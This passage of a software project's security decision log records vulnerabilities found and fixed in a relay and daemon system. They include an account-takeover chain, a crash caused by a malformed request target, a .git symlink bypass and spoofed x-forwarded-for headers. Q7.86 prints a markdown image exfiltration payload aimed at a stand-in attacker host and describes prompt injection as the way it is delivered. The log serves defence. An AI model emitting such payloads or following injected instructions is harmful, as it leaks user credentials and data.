keeps working. What it stops is the account being *used* with a password somebody
else chose.

**Status.** Current.

### Q7.81 — A stolen session became permanent ownership. Where was the hole?

**The defect.** `PUT /v1/me/email` demanded the current password only when the
account **already had a verified address**:

```ts
const existing = emailOf(db, caller.userId);
if (existing !== null && existing.verifiedAt !== null) {   // app.ts:1942
  const refused = await proveCurrentPassword(c, body);
```

For every other account a session bearer alone ran the whole chain: `PUT
/v1/me/email` to an attacker address → `POST /v1/me/email/verify` with the same
session → `POST /v1/forgot`, which `verifiedOwnerOf` now resolves to the victim →
`POST /v1/reset`, which writes a password the attacker chose, calls
`revokeAllSessions(…, null, …)` evicting the real owner, and mints the attacker a
session.

**Why it was not marginal.** `main.ts`'s bootstrap admin is created with `users`
and `api_keys` rows and **no `user_emails` row at all**, so the fleet's founding
`is_admin=1` account was in the vulnerable state by construction. So is every
account from the no-SMTP arm of `/v1/register`, and every admin-created account
that cleared its obligation without adding an address.

**It was silent, too.** The `email_changed` notice to the old address carried the
*same* `verifiedAt !== null` test, so the only case that warned the owner was the
case already refused.

**Why the exemption looked reasonable.** Its docblock said "adding one for the
first time needs no proof, because there is nothing to steal yet and clicking the
link is itself the proof". Both halves are about the wrong object. There is
nothing to steal *about the address*; the **account** is what gets taken, and
this route is what installs the channel it gets taken through. And clicking a
link proves control of a mailbox, never that the session holder owns the account.

**The fix is deleting the condition**, not adding a rule. `proveCurrentPassword`
already carries the only legitimate exemption — a caller with no
`user_passwords` row is let through, because their API key was already full
authority — and that stays exactly as narrow: **no session can exist without a
password row**, since all three `mintSession` call sites (`/v1/login`,
`/v1/register`'s no-mail arm, `/v1/reset`) require or create one. So the
exemption is unreachable by a session and the chain is closed rather than
narrowed.

**The client had the same rule and agreed with the defect.**
`emailChangeNeedsProof` read `me.emailVerified === true && me.hasPassword !==
false`, and `webcheck` asserted it. Two green assertions and a route, all three
wrong the same way — which is why the mirror is worth having only while it *is*
the mirror. Changing one without the other is a `400 currentPassword is
required` on screen.

**Status.** Fixed. `relaycheck` drives the refusal in the state that used to be
exempt (no address row) and `webcheck`'s case is kept with its expectation
inverted, because the state it names is the exposed one.

### Q7.82 — Two fields rode the snapshot with no bound, behind a comment saying they did

**The defect.** `session.ts` clamped nothing on a permission's `title` or
`options` — no cap on option count, none on `optionId`/`name` length, no clip on
the title — while `registry.ts` clamped `rawInput` and `content` beside them at
8 KiB each *because they ride the snapshot*. Which `title` and `options` also do.

**And `truncateEvent` declined to cut the event**, filed under "nothing to cut"
with a reason written out in full: permissions are *"already clamped far tighter
upstream by `clampBlob`, because they ride the snapshot"*. `clampBlob` bounds
`rawInput` and `content`. Neither is a field of `PermissionRequestEvent`. The one
event type whose exemption was argued in the most detail was the one with no
upstream bound to point at — the `sessionOf` failure, one file over from the
invariant named for it.

**The amplifier is the snapshot rather than the log.** A pending permission rides
`GET /sessions` for every session on the machine, every WS `hello`, and every
frame `touchSafe()` fans out: four seconds, every attached client, over the
relay, to a phone.

**The option cap is a refusal and the string caps are clips**, which is the split
the command list already makes. An `optionId` round-trips verbatim in the
response, so clipping one produces an answer the agent will not recognise, and
dropping options removes choices it offered — the thing `drawableOptions` spends
four rules being careful about. So a card past the cap is declined *to the agent*
with `invalidParams`, matching the elicitation refusals.

**Status.** Fixed at ingest, which makes `truncateEvent`'s sentence true rather
than aspirational; that arm now also clips the title, because the ingest cap is
what keeps the ordinary event small and this is what catches the one that is not.

### Q7.83 — `locations` was charged nothing, and three bounds read that number

**The defect.** `FileLocation[]` on `ToolCallEvent` and `ToolCallUpdateEvent`,
filled unbounded from agent input, counted by neither `estimateBytes` arm and cut
by neither `truncateEvent` arm.

**What it defeated, and why all three at once:** the 128 KiB per-event cap, the
per-session byte budget (`schema.sql` stores what `estimateBytes` returns, not
the payload length), and the WS outbound queue's `MAX_QUEUE_BYTES`. Every one of
them reads the estimate rather than the bytes, so an unaccounted field is
invisible to all of them together.

**It is the failure the code's own comment names.** The `tool_call_update` arm
opens *"an unaccounted one is an event that walks past the per-event cap
unnoticed"*, written when `content` and `rawInput` were added — above a sum that
did not include `locations`.

**Both halves are needed.** The terms in `estimateBytes` make an event's size
*honest*; `MAX_TOOL_LOCATIONS` at ingest makes it *small*. Counting alone would
only have made the oversize event visible. `toolCallId` got the same treatment on
the same grounds, and `SessionExit.detail` — which rides the snapshot under a
flat-192 event and carries the agent's own RPC error message — is clipped to the
512 a resume failure already uses.

**Status.** Fixed. Measured before: 40 long locations cost **0 bytes**.

### Q7.84 — The guard the relay wrote down, missing on the thing it forwards to

**The defect.** `@hono/node-ws`'s upgrade handler opens with an unguarded `new
URL(request.url ?? "/", "http://localhost")`. llhttp and the WHATWG parser
disagree about what a request target is: `GET //% HTTP/1.1` reaches a
`node:http` handler with `req.url === "//%"` and that constructor throws. So do
`/\` and `//[`. Nothing then writes to the socket or destroys it —
`requestTimeout` is already cleared and `keepAliveTimeout` only arms once a
response is sent.

**`relay/proxy.ts` carries this exact guard, with a comment describing this exact
failure** (Q7.56's neighbour, `readToken` and `pathOf`). It did not protect the
daemon: `readToken` reads the `Authorization` header *without touching the URL*,
so a request carrying a valid bearer never reaches the relay's own `new URL`, and
`path: req.url` is then forwarded verbatim. Any token for the machine —
`session:read` is enough — plus one malformed target. The relay was fixed and the
thing it forwards to was not.

**Wrapped rather than prepended, and that decides where it lives.** Every
`upgrade` listener runs, so a guard registered first would answer the socket and
then watch the unguarded handler throw on the same request anyway. Taking the
listener off and putting it back behind the check is the only arrangement where
the bad target never reaches it — and it belongs inside `createApp`'s
`injectWebSocket` rather than in `scripts/daemon.ts`, so a caller cannot forget
it and `daemoncheck` can drive it.

**Status.** Fixed. Reproduced first: removing the wrapper prints `TypeError:
Invalid URL … input: '//%'` and exits non-zero. Driven on a raw socket, because
`fetch` and `ws` both normalize the target through the parser this is about.

### Q7.85 — The `.git` refusal was a string test, and one symlink walked past it

**The defect.** `safeRelPath` refuses a `.git` segment in the path the caller
*typed*, and its own comment gives the reason as a security rule. With `g ->
.git` anywhere in the tree, `?path=g/config` contains no `.git` segment to refuse
— and `probeContained` answered `true`, correctly, because `.git` really is
inside the workspace. Both checks passed and `.git/config`, which carries remote
URLs and the credential helper configuration, went out to any `session:read`
grant.

**The link is the shape that occurs.** git's hardening covers writing *through*
such a link, not its existence, so one survives a clone; an agent makes one with
a single `ln -s`. `O_NOFOLLOW` on the open cannot help and is not meant to — it
governs the leaf, so it refuses `?path=g` and says nothing about `?path=g/config`
where the link is an interior segment.

**Where the re-test lives is forced.** `probeContained` resolved the parent,
compared it and threw the answer away; it is the only function holding a resolved
path, so testing anywhere else means a second `probeRealpath` of the same parent
on every download. `probeRequestable` is that function with the answer kept, and
`probeContained` survives as the two-answer form its four existing assertions
ask for.

**Only the part below the root is examined**, because the root's own absolute
path is not the caller's doing: a workspace that legitimately lives under a
directory called `.git` must not be unservable in its entirety.

**Status.** Fixed.

### Q7.86 — Agent markdown could fetch from anywhere, with no tap

**The defect.** `Markdown.tsx`'s component map overrides `a` and routes it
through `openableHref` — *"agent output is untrusted text from a model that is
quoting a repository"* — and overrode no `img`. So `![](https://attacker/?d=…)`
fell through to react-markdown's default `<img src>`, whose transform allows
`https:`, and the browser issued a request to a host the **agent** chose, on
render, with no interaction, from the origin holding `reemoat.credential`.

**It is strictly worse than the case `openableHref` was written for**, which is
what makes it the finding rather than a variation: a link needs a tap. Prompt
injection planted in a README, an issue body or a page the agent fetched is the
whole delivery mechanism, and the query string is the channel.

**Nothing regresses by drawing the alt text**, which is the same trade `a` makes
for an unopenable href. There is no image an agent can name that this origin
would serve: a file under the workspace is reached through `GET
/sessions/:id/files` with a header and rendered by `ImagePreview` from a `Blob`,
never by an `src` a browser follows.

**And the app grew its first CSP**, which is defence in depth rather than the
fix. `connect-src` is the directive that can break everything, because this page
is deliberately cross-origin to the fleet — so the relay is listed from
`relayUrl` rather than written down, and its **WebSocket** origin is derived from
the same URL, `https` and `wss` being different sources to CSP. Measured against
the real bundle: no inline script, no inline style, no `url(data:` in the emitted
CSS, no `eval`, no workers.

**Status.** Fixed. `webcheck` reads `Markdown.tsx` off disk to assert the `img`
key exists and binds no `src`, and that the anchor is still an anchor — so the
pair cannot pass by the map having been emptied.

### Q7.87 — `x-forwarded-for` was believed, and read from the wrong end

**The defect.** `callerAddressOf` took the **first** `x-forwarded-for` entry and
preferred it to the socket, with no trusted-proxy setting anywhere. That value is
half of `loginKey` and the whole of `addressKey`, `registerKey`, `confirmKey` and
`resetKey` — so the address half of every rate limit was a string the caller
typed. Rotating it defeated the login counter and the per-address backstop
together; spelling somebody else's address into it **aimed** them, refusing that
address its own sign-in *and* its own `POST /v1/forgot` for fifteen minutes, with
no credential and no name known.

**The stale comment is the reason it sat unexamined.** `net.ts` opened with "two
callers, both of which only ever *print* the answer … nothing authorizes on it,
and nothing may start to." There were more callers than two, one of them was
`throttle.ts`, and a `429` is a refusal. A property the code appears to have and
nothing enforces, again.

**Counted from the right, and zero by default.** An ordinary reverse proxy
*appends*, so the rightmost entry is what the hop nearest this service observed
and the leftmost is whatever the client sent. `REEMOAT_CP_TRUSTED_PROXY_HOPS`
says how many of those hops are yours; `0` ignores the header outright.

**The default is the safe answer and the wrong one for the recommended shape**,
and that trade was put to the operator rather than guessed: `compose.yml`
publishes on `127.0.0.1` and `install.sh` recommends a TLS proxy in front, where
hops at zero collapses every caller into one bucket. So `install.sh` asks — the
bind address is an intention rather than evidence, since a Tailnet and an `ssh
-L` both look like loopback with nothing in front — and the API warns once, at
runtime, when a request arrives carrying the header while it is ignoring it.

**Status.** Fixed. Measured through the route: forty sign-in attempts each
claiming a different address met the counter 34 times with the header ignored,
and **0 times** with it believed.

### Q7.88 — Four smaller things the same sweep turned up

**`POST /v1/reset` spent the link outside its transaction.** `claimEmailToken`
ran above `BEGIN`, so the `ROLLBACK` on the `email_taken` arm undid the password,
the session sweep and the verification while the link stayed burned — stranding
an invitee, for whom that link is the only credential there is. Moved inside;
the refusal is thrown as a private marker so the one exit from the block stays
the `ROLLBACK`, because an un-rolled-back `BEGIN` takes out the *next* writer on
the shared connection.

**`POST /v1/enroll` counted nothing.** The only route above THE LINE that took a
body and had no throttle. Not what makes a code unguessable — 256 bits of CSPRNG
is — but what bounds an unauthenticated caller driving one WAL writer-lock
acquisition per request against the file the relay shares. Its own namespace, so
a machine enrolling behind a NAT cannot spend the budget that gates signing in
from it.

**`burnUserCodes` keys on `created_by`, which is the wrong column for half the
question.** It burns what the offboarded person *minted*; `POST
/v1/admin/machines/:id/enrollments` mints one *for* them, with the admin as
`created_by`. So the sentence Q7.60's sweep exists for was reachable with the
code somebody was **handed** — machine id, fleet public keys, and an
`issueTunnelKey` that retires the running daemon's tunnel key.
`burnGranteeCodes` is the sibling, keyed on the grant, called *before* the delete
route drops the grants it reads.

**`looksBinary` was four synchronous syscalls per untracked file.** `stall.ts`
carved out an exception for it — "paths git has just reported, i.e. inside a
repository git has already walked" — and that does not survive being read twice:
git having listed a path says nothing about whether the *next* syscall returns,
and for a `plain` session the root git walked is a directory the caller named.
The work moved to `probeBinary` and runs **after** the file cap, so only files
somebody will see are probed. The exception is withdrawn rather than narrowed.

**And the relay had no upstream timeout.** A tunnel that accepts a CONNECT and
says nothing held the browser until its own socket closed and held one of
`MAX_CONCURRENT_STREAMS` for the same length of time. 120 s, because the slowest
legitimate request is a real one — `POST /sessions` starts an agent and
`worktree add` runs the repository's own hooks.

**Status.** All fixed.

### Q7.89 — What the sweep looked at and did not find

Worth recording, because "we looked" is only useful written down.

**Refuted by measurement, not by argument:** `relay/tunnel-endpoint.ts`
`handleUpgrade` has no `socket.on("error")` before its work, which reads as a
violation of the invariant `proxy.ts:158` states. It is not one. That handler is
entirely synchronous — `bearerToken` is a regex, `resolveTunnelKey` is a
synchronous `node:sqlite` query — so no event can be delivered before a listener
exists; `ws` attaches its own as the first statement of its `handleUpgrade`; and
write-after-`destroy()` emits no `'error'` at all. Measured: **0 uncaught
exceptions over 600 RST-raced iterations** across all four arms. The same rig
with a 50 ms yield inserted *does* crash, which is why `proxy.ts` needs it and
this does not.

**Also refuted:** `AgentsPanel.tsx`'s "Open the sign-in page" anchor, whose URL is
scraped from a pty transcript — scheme-constrained to `http(s)` by `extractUrls`,
`rel="noreferrer"`, and sourced from a vendor CLI resolved by table lookup rather
than from an agent.

**Found sound and worth naming:** `token.ts` (strict base64url re-encode, exact
`alg` compare, signing input taken from the original bytes, every claim checked
for presence and type), `auth.ts` (the `aud` binding, symmetric leeway, unknown
scopes dropped rather than rejected), `relay/authorize.ts` (verify → `aud` → live
user/machine/grant, identical 404 for no-machine and no-grant),
`relay/registry.ts` (identity-checked unregister, presence below the guard),
`relay/tunnel.ts` (CONNECT spliced to a fixed loopback target — `:authority` is
ignored, so a compromised relay gets no SSRF), `forwardHeaders` (`reemoat-*` and
hop-by-hop stripped), `callerAuth` (prefix picks a table, constant-time compare,
disabled checked on both lanes), and the email-token purpose and address
bindings.

**Knowingly open, and re-stated rather than fixed:** an admin owns `smtp.host`,
so *"an admin may take a credential away and may never issue one"* is false in
the sense that they can point mail at a host they control and drive
`POST /v1/forgot`. Not a code change — an admin can already self-promote via
`POST /v1/admin/users {isAdmin: true}`, delete anyone, and reassign every
machine's owner — so what was wrong was the sentence, which claimed more than the
deletion of the admin reset bought.

**Status.** Current.

### Q7.90 — `changes/diff` was absent, not degraded, for a plain session in a subdirectory

**The defect.** Everything `changes.ts` parses is **repo-root-relative**;
everything downstream of it — `safeRelPath`, `requestedPath`,
`GET /sessions/:id/files` — resolves against `workspace.root`. Those are the
same string for every worktree session and every plain session opened at the top
of a repository, which is why nothing caught it. Open a plain session in a
*subdirectory* and the listing offers `nested/inner.txt` for a file that lives at
`<root>/inner.txt`: `safeRelPath` resolves it to something that is not there, the
change-set membership test never matches, and **every** path in that listing
answers `path_not_changed`. The feature was not worse for that shape of session,
it was absent, and silently.

**`--relative` is the obvious fix and it is the wrong one.** It moves only the
diff half. Measured with the flags this code really uses: `git status
--porcelain=v2 -z` is **repo-root-relative** — `-z` turns off
`status.relativePaths`, which defaults to true — so `diff` and `status` already
agree, and adding `--relative` to `diff` alone splits one changed file into two
rows under two keys, each carrying half its fields. The first attempt at this fix
did exactly that and `daemoncheck` caught it, which is the argument for driving
these through real git rather than asserting the parsers.

Worth writing down because reading the output by hand misleads: **drop `-z` and
the answer inverts.** From a subdirectory, `status --porcelain=v2 -uall` prints
`kept.txt` and `../top.txt` while `status --porcelain=v2 -z -uall` prints
`nested/inner.txt` and `kept.txt`.

**So the translation is one function, at the boundary, on the way out.**
`repoPrefix` asks `rev-parse --show-prefix` — `""` at a repository top, which is
the overwhelming majority and the case that costs nothing —
and `toWorkspaceRelative` renames every row. Asked rather than derived from
`workspace.git.repoRoot`, because that field is the **main** worktree and a
worktree session's root is deliberately not under it: subtracting one from the
other would be wrong in exactly the case that works today.

**A file changed outside the tree keeps its `../…` spelling and loses
`addressable`.** It is true and worth showing — the agent touched something
outside its own directory — and it is not something anybody can ask about, since
`safeRelPath` refuses a `..` segment. That is what `addressable` already means,
so the field is widened rather than joined by a second one.

**Status.** Fixed.

### Q7.91 — git C-quotes a path, and the header rewrite matched by prefix

**The defect.** `rewriteNoIndexHeader` found the two path lines with
`startsWith("--- a/")` / `startsWith("+++ b/")`. git **C-quotes** a path
containing a non-ASCII byte, a `"` or a `\`, and the line then reads `+++ "b/…"`
— matching neither. Measured against real git on `réz"me.txt`:

```
diff --git "a/r\303\251z\"me.txt" "b/r\303\251z\"me.txt"
--- /dev/null
+++ "b/<the daemon's absolute path>"
```

The `diff --git` line *was* rewritten, because that one is replaced outright
rather than matched. So the patch came out **self-contradicting**: one header
line naming the relative path and the next naming the absolute one —
un-appliable, and leaking the daemon's layout in the very header this function
exists to clean.

**Both path lines are replaced outright now**, the way `diff --git` already was.
Three things fall out. Quoting stops mattering, because nothing is parsed. The
`$&` hazard goes with the `String.replace` — Q4's measured case, where a file
named `a$&b.txt` spliced the absolute path back in through a string
replacement's expansion — and there is no replacement left to expand. And the
header cannot half-agree with itself, because one value writes all three lines.
`/dev/null` is the one side that survives, because `diffFile` invokes
`--no-index` with exactly `/dev/null` and the file.

**Status.** Fixed. Driven with the old logic in place to check the new cases
isolate the new defect: only the C-quoted ones fail, and they fail by finding the
absolute path in the patch.

### Q7.92 — A second relay needs one thing, and it is not more relays

**The question.** `relay_tunnels.relay_id` has existed since the API and the
relay were split, written by whichever relay holds the tunnel and read by
nothing: `isOnline` asked "is there a row" and threw the name away. What does
running a second relay actually require?

**One thing.** A `TunnelRegistry` is in-memory per process, so a request that
lands on relay B for a machine held by relay A answers `503 no_tunnel`. With
every relay behind one name that is a one-in-N coin flip **per request** — the
client recovers, because `forgetRoute()` fires on exactly that code and it
re-probes, so the failure is slowness rather than breakage, which is worse in
the way that matters: it looks like a flaky fleet rather than like one line of
missing configuration.

So `RelayView` gained `relayFor(machineId)`, `dbRelayView` answers it from the
column that was already there, and `app.ts` resolves the URL a **browser** is
given per machine. Two of the four `relayUrl` call sites became per-machine and
two did not, which is the whole design:

**`relayUrl` and `relayUrls` answer different questions and only one is
per-machine.** `REEMOAT_CP_RELAY_URL` is the name *daemons* dial. It is written
into `identity.relay_url` at enrollment and never asked about again — the daemon
makes exactly one request to the control plane, ever — so it has to stay one
value pointing at whatever fronts the relays. That indifference is the property
that makes adding a relay invisible to the fleet: **no daemon reconnects because
of it, and none can be told to.** `REEMOAT_CP_RELAY_URLS` is where a *browser*
goes, and it must be the specific relay.

**Three ways to land on the default, all correct.** No map — the single-relay
shape, which is every deployment until somebody splits. No tunnel — there is
nothing to route *to*, and the answer rides beside `relayOnline: false`, which
is what the client acts on. A slot with no entry — an operator added a relay and
forgot its URL, and the shared name is the coin flip they had before rather than
a `null` no client field is typed for.

**`relayFor` on a registry answers "me or nobody" and deliberately does not read
the table.** An embedded control plane holds its own tunnels and knows of no
others; a relay answering on another relay's behalf would route a browser on the
strength of a row it does not maintain.

**The boundary is one host.** Every relay reads `machines`, `users`, `grants` and
the signing key's public half from the same SQLite file per request. Several
processes on one box is what this supports; several boxes needs a replicated or
queried authorization path, and asking the API per request puts it back on the
data path — strictly worse than one relay. Which means what this buys is fault
isolation and fd headroom, **not capacity**: the per-request cost at the relay is
one Ed25519 verification and three indexed reads, orders of magnitude above what
a fleet of this shape generates, since the browser polls once every four seconds
per machine. What binds first is `ulimit -n`, because a relay holds one socket
per tunnel plus up to three per attached browser.

**The heartbeat had to learn an ordering, and that was the one real bug the
change surfaced.** "Newest tunnel wins" lives in one `TunnelRegistry`, so a
daemon that reconnects onto a different relay leaves the old one holding a dead
socket until its ping tick (20 s × 2 misses) — and `stats()` iterates the map
directly, unlike `get()`, so it does **not** test `isClosed`. The flush shared
`up`'s unconditional upsert, which re-stamps `relay_id`. So relay A reclaimed
the row from relay B every five seconds for up to forty, and then A's own `down`
— scoped to a `relay_id` it had just re-stamped — deleted the *live* relay's
row.

Invisible while there was one relay, which is why a shared statement was fine
until `relayFor` gave that column a reader. The first draft of this entry, and
of `deploy/RELAYS.md`, both asserted the opposite — "the newer relay's upsert
already owns the row" — reasoning only about `unregister` and never about the
heartbeat.

The fix is a predicate on the conflict rather than a signal between processes:
the flush may write a row only if it is **already this relay's, or the tunnel it
describes is not older than the one the row describes**. `connected_at` is the
tunnel's own `since`, so a genuine redial wins and a stale relay loses — and the
flush keeps repairing a lost registration write, which dropping `relay_id` from
the SET list would have broken while also fixing the theft.

What is genuinely unsolved is only the dead socket, which costs one descriptor
on the old relay until its ping tick.

**Three things the review caught that shipped wrong the first time**, recorded
because each is the same shape — a value that looks right and fails somewhere
nobody is watching:

- **The CSP was built from `relayUrl` alone.** Added earlier the same day, and
  correct while there was one relay: the moment `relayUrlFor` could answer with
  another, the document said `connect-src … relay-1` while the token said go to
  relay-2, and the browser refused its own request. Worse than the `503` this
  feature exists to remove, because a CSP violation has no HTTP status —
  `forgetRoute` never fires and the machine reads offline permanently.
- **`wss://` was documented as the scheme for both settings, and it is the one
  the browser cannot use.** `machine.ts` probes a route with `fetch`, which
  rejects a `wss:` base, and `streamUrl` derives the socket scheme itself —
  anything that is not `https:` becomes a **plaintext** `ws:` carrying
  `?token=`. So the value that looks more secure breaks reachability *and*
  downgrades the stream. `parseRelayUrls` refuses anything but `http:`/`https:`
  now; `REEMOAT_CP_RELAY_URL`'s own check is left alone deliberately, because
  tightening it would refuse a start on hosts already running.
- **`cpctl admin relay` could not show which relay held a tunnel**, while the
  document pointed at it as the way to verify the map. `TunnelStats` had no
  `relayId` and `dbRelayView.stats` did not select the column. That made the
  change's own stated failure mode — a wrong map degrading silently to the
  shared name — undetectable by any shipped means short of opening the database.
  The column is on the interface now.

**Status.** Current. `deploy/RELAYS.md` is the operational half, and it leads
with what enrollment bakes, because `REEMOAT_CP_RELAY_URL` and
`REEMOAT_CP_ISSUER` are the two values that cannot be changed without visiting
every machine.

### Q7.93 — A second relay under one id was documented, not prevented

**The question.** `deploy/RELAYS.md` told operators to give each relay its own
`REEMOAT_CP_RELAY_ID` and not to recycle a name. Can that be enforced instead?

**The harm it was advising against.** `sweep` deletes rows carrying this relay's
name that this relay's own flush did not stamp — which, with two relays under one
name, is every machine on the other one. They alternate every five seconds and
the fleet flaps between reachable and offline, with nothing anywhere saying why.
It is not corrupting and it is not a security failure; it is invisible, which is
worse to diagnose.

**So the relay claims its slot at boot and refuses a name a live process holds.**
`claimDaemonLock` is the precedent one package over — "two daemons on one file"
answered the same way — and the shape differs in exactly one respect that decides
the mechanism: a relay runs in a **container**, so `pid` and `os.uptime()` are
meaningless across namespaces. The daemon can ask whether a pid is alive; this
cannot. Liveness is therefore a **heartbeat**, stamped by the flush that already
runs every five seconds, and a `nonce` is what tells two processes apart under one
name.

**Taking over a stale claim is the normal path rather than an edge case.** A
relay killed hard leaves this row exactly as it leaves its tunnel rows, so
`RELAY_CLAIM_STALE_MS` is when the replacement may have the name — refusing for
ever would make a crash cost a manual repair on the fleet's only entrance. What
is refused is only a claim that is *fresh*.

**And `releaseRelayId` runs on `SIGTERM`, which is what keeps this safe for
deploys.** Measured: a relay stopped cleanly and replaced immediately starts with
no wait at all; the row is gone the moment it exits. Only a hard kill pays the
window, and the refusal says how many seconds are left. The release is
identity-checked for `unregister`'s reason — without it, a relay *refused* at
boot would clear the live relay's claim on its way to `exit(2)`, turning the
guard into the collision it exists to prevent.

**The other mistake is silent rather than destructive, and gets visibility rather
than a refusal.** A `relay_id` holding tunnels with no entry in
`REEMOAT_CP_RELAY_URLS` degrades to the shared name and keeps working — one
request in N slowly, no error anywhere. Nothing can cross-check it at startup,
because the API cannot know which relays will exist. So `GET /v1/admin/relay`
reports `unmapped`, and `cpctl admin relay` prints it above the listing. Empty
when no map is configured, deliberately: that is the single-relay shape, where
falling back to the one URL is the answer rather than a fallback, and warning
there would warn every existing deployment about itself.

**What is deliberately *not* enforced.** Nothing can stop somebody running a
container by hand, and no check in this repository decides the topology — which
relay a load balancer sends a daemon to, whether TLS is really in front, whether
the DNS name is one you control. Those stay in `deploy/RELAYS.md`. The rule drawn
here is narrower and worth stating: **the two failures that produce no error get
one — a refusal where the state would be destroyed, a line in `cpctl` where it
would merely be wrong.**

**Status.** Current.

### Q7.94 — CI was red on three commits, and CD's premise had expired

**Two things, and only one of them was a fix.**

**CI.** `daemoncheck` went red on Linux for three pushes in a row while every
driver was green on the laptop that wrote them. The cause is the class
`check.yml`'s own header names as the thing it catches most often: a new fixture
ran `git commit` through a bare `execFileSync` instead of the `git()` helper
eight lines above it, which passes `-c user.name` and `-c user.email` for exactly
this reason. A developer machine has a global git identity and a runner does
not, so the commit failed with `Author identity unknown` — 128, at the first
assertion of a block that had never run anywhere but here.

Reproduced locally rather than fixed by inspection:
`GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null pnpm daemoncheck` is the
runner's condition on a laptop, and it is worth knowing about — it turns this
whole class from "push and find out" into a command.

**CD.** `CLAUDE.md` said "there is no CD, and that is a decision", and the reason
it gave was specific: on a machine where you develop and run agents at once,
every push to `main` interrupts every turn in flight and drops every pending
approval. That reason is entirely about the **daemon** and it is untouched —
nothing deploys one and nothing here should.

The other half expired. The control plane runs on a host of its own now, where
no agent has ever run; recreating it costs relay tunnels a redial, which the
daemons perform themselves and which `deploy.sh` already declines to pay when the
diff did not reach the relay. So the cost that made CD unacceptable is not the
cost this pays, and a decision whose premise has gone is worth re-deciding rather
than inheriting.

**What was kept from it: deploying stays a deliberate act.**
`workflow_dispatch` and nothing else — no `push`, no schedule. The runner
replaces the ssh session, never the judgement about when, and
`deploy/README.md`'s manual path stays correct and supported. `deploy.sh` had
anticipated this in two comments ("when there is [CI], it calls exactly this
script with `--ref <sha>`"), and calling the script rather than reimplementing it
is what keeps "deploy" one act whichever performs it.

**It refuses a commit whose `check` run is not green**, which is a gate rather
than a courtesy: the drivers are the entire automated safety net here, and
pushing then deploying before the run finishes is the one way around them.

**The first version put all of that in the workflow file, and that was the
mistake worth recording.** Five `run:` blocks — a secret guard, the CI gate, the
ssh, a health probe — none reachable by any driver, because a workflow is
exercised by pushing and watching. `deploy.sh` had already written the rule down
one file over: keeping the logic in a script is what lets it be tested by running
it. So it moved to `deploy/ci-deploy.sh`, and `deploy.yml` is a checkout and one
call.

**Two seams make it drivable with no host, no network and no secrets**, the same
shape as `SmtpDialer` and `AgentProcess`: `SSH` is what reaches the box, so
`echo` turns the remote argv into an assertion, and `GH` is how the commit's
verdict is read, so a stub exercises the green path and the red one.
`deploycheck` drives twenty-four cases — every named secret separately, because a
guard that fires on "any of them missing" passes just as well when it names the
wrong one; the daemon refusal; both gate outcomes and the escape; the exact
remote command; and that the key is neither printed nor left behind.

**What is still unmeasured is only the transport.** No ssh has run and no host
has answered; the decisions are exercised, the socket is not. That is a smaller
and more honest claim than the first version's, which said the whole thing was
unverified because it had no way not to be.

**Status.** CI fixed. CD current; its logic driven, its ssh unexercised.

### Q7.95 — Is an ownerless machine a way round the per-user limit?

**Rule.** It was, and it is closed. **No non-revoked machine is ownerless.**

**What the hole was.** A machine with no `machine_owners` row has no owner, and
both gates on a machine are facts about its owner — the machine limit and, since
Q1.52, the owner's ban. So an ownerless machine was outside *both*: live,
enrolled, reachable by anybody holding a grant, and governed by nothing.

**How one was made.** Two routes. `DELETE /v1/admin/users/:id` released their
machines rather than revoking them, on the argument that deleting a person should
not take a daemon somebody may still be running off the network. And `POST
/v1/admin/machines` took `ownerId` as optional, so one forgotten flag produced
one ungoverned machine — `cpctl` printed a warning and carried on.

**Both are closed.** The delete revokes each machine it finds (mark, burn its
codes, release the ownership row — the same three statements the revoke route
runs); `ownerId` is required, and the arm behind it is deleted rather than
defaulted. The old argument's true half survives as the stated price: a daemon
somebody is still running does go off the network, and getting it back means
enrolling it again on that host. That is the right trade only because the person
is *gone*, which is exactly why `disable` does not do it (Q1.52).

**Ownerless rows still exist, and must.** Every revoke produces one:
`releaseOwner` has to drop the row or the machine holds its label and its quota
slot for ever (Q1.43). So the invariant is deliberately the narrow one — no
*non-revoked* machine is ownerless — and a revoked machine is inert:
`resolveTunnelKey` refuses its dial and `authorize` refuses its requests.

**Legacy rows are the residue, and are handled rather than grandfathered.** A
machine registered before `machine_owners` existed still has no row, and refusing
those would take every one of them off the network on deploy. They keep working,
they are visible (`owner: null` on `GET /v1/admin/machines`, `no owner` in `cpctl
admin machines`), and `PUT /v1/admin/machines/:id/owner` adopts one — which is
what puts it under both gates. **Found on the development instance while writing
this**: the only machine actually in use there was one of them, so the limit did
not apply to it at all.

**Measured.** `relaycheck` drives both closures: a deleted user's machine is
revoked rather than left ownerless and the route reports `machinesRevoked`;
`POST /v1/admin/machines` refuses a missing *and* an empty `ownerId`; and the
adoption route is now tested against an orphan built by SQL, because no route
makes a live one any more — which is the honest fixture, since the legacy row is
exactly what that route exists to rescue.

**Status.** Reversed an earlier decision

### Q7.96 — Import stacks the same body-cancel discipline behind the same middlewares. Is Q7.62 now asked twice?

**Question.** Q7.62 asks whether the upload route's body-cancel discipline
actually survives the auth and scope middlewares stacked above it — the code is
written and the measurement is missing. `POST /fs/import` is the second route with
that shape.

**Position.** Yes, and it is the same open question rather than a new one. Both
routes refuse through a wrapper that cancels the request body first, both sit under
the same gate, and neither has been driven with a real body in flight through a
relay under a scope that refuses. What makes it matter is stated where the
discipline is: the relay grants a stream's window on consumption, so a reader that
stops parks the sender at 256 KiB, and the next valve is the tunnel's 8 MiB socket
check — which closes the whole tunnel for that machine, taking every other session
on it down rather than the one request.

What the second route changes is only the arithmetic: the remedy, whenever somebody
measures it, now fixes two places instead of one. It is not a reason to measure it
sooner than Q7.62 already argues.

**Since.** A third route arrived (`POST /plugins`) and the remedy was written: the
cancel hangs off `isStreamingRoute` rather off each handler, so all three are
covered by one guard and the arithmetic this entry was about stopped being a
reason to wait. Q7.62 carries the finding, the measurement and what is still
missing; this entry's answer — *the same question, not a new one* — is unchanged
and was right.

**Status.** Closed by Q7.62

### Q7.97 — Import is serialised for the whole daemon. Is that a bound or a bottleneck?

**Question.** `POST /fs/import` answers `409 import_busy` while another import is
unpacking. Every other route in this daemon is concurrent.

**Decision.** Serialised, because this route is the only one with **no accounting
that outlives the request**. An upload is charged against a session's 100 MiB and
100 files; an import is charged against nothing once it has landed, and the relay
allows 256 concurrent streams — which at these bounds is 12 GiB of archive and 125
GiB of unpacked tree. A per-request size cap cannot see that, so the bound has to
be on arrival.

**Why it costs nothing real.** A person imports a codebase about as often as they
start a project, and the window is one archive rather than one session. Two people
sharing a machine and importing in the same thirty seconds is the entire collision
surface, and the answer is a sentence telling them to try again.

**Rejected.** A queue. That turns a bound into latency nobody can see the end of,
